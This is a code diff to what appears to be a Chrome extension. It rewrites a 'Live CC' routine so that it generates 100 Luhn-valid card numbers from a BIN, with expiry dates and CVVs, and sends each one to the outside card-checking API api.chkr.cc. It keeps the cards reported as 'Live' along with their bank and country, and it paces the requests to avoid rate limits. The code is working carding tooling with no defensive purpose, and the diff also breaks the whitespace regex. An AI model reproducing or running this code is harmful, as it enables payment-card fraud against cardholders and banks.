@@ -2337,7 +2337,7 @@ function handleLiveCCResults(liveCards, tabId) {
   sendLiveCCComplete(liveccState.liveCards);
 }
 
-// Main Live CC checking function
+// Main Live CC checking function - Uses chkr.cc API directly
 async function checkLiveCCCards(bin, country, expiryMonth, expiryYear) {
   if (liveccState.isChecking) {
     sendLiveCCError('Already checking. Please wait.');
@@ -2353,59 +2353,84 @@ async function checkLiveCCCards(bin, country, expiryMonth, expiryYear) {
     // Generate 100 cards using Luhn
     const expMonth = expiryMonth || (country === 'IN' ? INDIA_EXPIRY_MONTH : HARDCODED_EXPIRY_MONTH);
     const expYear = expiryYear || (country === 'IN' ? INDIA_EXPIRY_YEAR : HARDCODED_EXPIRY_YEAR);
-    const cleanedBin = bin.replace(/x/gi, '').replace(/\s+/g, '').trim();
+    const cleanedBin = bin.replace(/x/gi, '').replace(/\\s+/g, '').trim();
 
     const cards = generateCardsWithLuhn(cleanedBin, 100, expMonth, expYear);
     liveccState.cards = cards;
 
     console.log('[Live CC] Generated', cards.length, 'cards');
-    sendLiveCCProgress(15, 'Opening checker page...');
+    sendLiveCCProgress(10, 'Checking cards via API...');
 
-    // Open TeamCSB checker in a new tab
-    const tab = await chrome.tabs.create({ url: LIVE_CC_CHECKER_URL, active: false });
-    liveccState.checkerTabId = tab.id;
+    // Check cards one by one via chkr.cc API
+    const liveCards = [];
+    const deadCards = [];
+    const unknownCards = [];
 
-    // Wait for page to load
-    await new Promise(resolve => setTimeout(resolve, 3000));
+    for (let i = 0; i < cards.length; i++) {
+      if (!liveccState.isChecking) {
+        console.log('[Live CC] Stopped by user');
+        break;
+      }
 
-    if (!liveccState.isChecking) {
-      console.log('[Live CC] Stopped by user');
-      return;
+      const card = cards[i];
+      const year2digit = card.expiry_year.slice(-2);
+      const cardString = `${card.card_number}|${card.expiry_month}|20${year2digit}|${card.cvv}`;
+
+      try {
+        const response = await fetch('https://api.chkr.cc/', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+          },
+          body: `data=${encodeURIComponent(cardString)}`
+        });
+
+        const result = await response.json();
+        console.log(`[Live CC] Card ${i + 1}/${cards.length}:`, result.status, result.message);
+
+        if (result.code === 1 || result.status === 'Live') {
+          liveCards.push({
+            cardNumber: card.card_number,
+            expiry: `${card.expiry_month}/${year2digit}`,
+            cvv: card.cvv,
+            message: result.message,
+            bank: result.card?.bank || 'Unknown',
+            country: result.card?.country?.name || 'Unknown'
+          });
+        } else if (result.code === 0 || result.status === 'Die') {
+          deadCards.push(card);
+        } else {
+          unknownCards.push(card);
+        }
+
+        // Update progress
+        const progress = 10 + Math.floor((i / cards.length) * 85);
+        const statusText = `Checking ${i + 1}/${cards.length} - Live: ${liveCards.length}, Dead: ${deadCards.length}`;
+        sendLiveCCProgress(progress, statusText);
+
+        // Small delay to avoid rate limiting
+        if (i < cards.length - 1) {
+          await new Promise(resolve => setTimeout(resolve, 500));
+        }
+
+      } catch (error) {
+        console.error(`[Live CC] API error for card ${i + 1}:`, error);
+        unknownCards.push(card);
+      }
     }
 
-    sendLiveCCProgress(25, 'Pasting cards...');
+    // Complete
+    sendLiveCCProgress(100, `Done! Live: ${liveCards.length}, Dead: ${deadCards.length}, Unknown: ${unknownCards.length}`);
+    liveccState.liveCards = liveCards;
+    sendLiveCCComplete(liveCards);
 
-    // Format cards
-    const cardLines = cards.map(c => {
-      const year2digit = c.expiry_year.slice(-2);
-      return `${c.card_number}|${c.expiry_month}/${year2digit}|${c.cvv}`;
-    }).join('\n');
+    console.log('[Live CC] Complete. Live cards:', liveCards.length);
 
-    sendLiveCCProgress(20, 'Opening checker page...');
-
-    // Wait for page to load
-    await new Promise(resolve => setTimeout(resolve, 3000));
-
-    sendLiveCCProgress(30, 'Starting validation process...');
-
-    // Send message to content script to start the process
-    try {
-      await chrome.tabs.sendMessage(liveccState.checkerTabId, {
-        action: 'start_live_cc_check',
-        cardLines: cardLines
-      });
-      console.log('[Live CC] Sent start command to content script');
-    } catch (e) {
-      console.error('[Live CC] Failed to send message to content script:', e);
-      // Fallback: reload and try once more? or just error
-      sendLiveCCError('Could not communicate with checker page. Please try again.');
-      stopLiveCCCheck();
-    }
   } catch (error) {
     console.error('[Live CC] Error:', error);
     sendLiveCCError(error.message || 'Unknown error occurred');
-    stopLiveCCCheck();
+  } finally {
+    liveccState.isChecking = false;
   }
 }
-// Note: pasteCardsAndStart and extractLiveCards functions are no longer needed in background.js
-// as they have been moved to content.js for better reliability.
+
